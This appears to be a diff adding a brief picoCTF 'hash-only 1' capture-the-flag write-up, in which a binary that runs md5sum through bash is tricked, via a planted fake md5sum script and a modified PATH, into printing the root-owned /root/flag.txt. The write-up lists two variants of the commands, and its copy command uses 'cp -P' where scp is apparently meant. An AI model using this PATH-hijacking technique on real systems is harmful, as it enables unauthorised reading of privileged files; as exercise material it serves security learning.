@@ -1,0 +1,25 @@
+picoctf hash-only 1 writeup
+
+1.connect to server and we can find a binary file 
+
+2.just execute it and it print a flag which is encrypted by md5
+
+3.we can use "cp -P 55610 ctf-player@shape-facility.picoctf.net:~/flaghasher ." to copy this binary to our machine
+
+4.i use ghidra to decompiler it and i find it just execute "/bin/bash -c \'md5sum /root/flag.txt\'"
+
+5.so we create a /md5sum binary to print the flag and trick the system to use our script
+
+method one:
+=> echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
+=> chmod +x md5sum
+=> export PATH=.:$PATH
+
+# you can use "which md5sum" in home dir to check whether it is successful
+
+method two:
+=> echo -e '#!/bin/bash\ncat "$@"\n/bin/md5sum "$@"' > md5sum
+=> chmod +x md5sum
+=> PATH=.:$PATH ./flaghasher
+
+6.get flag!
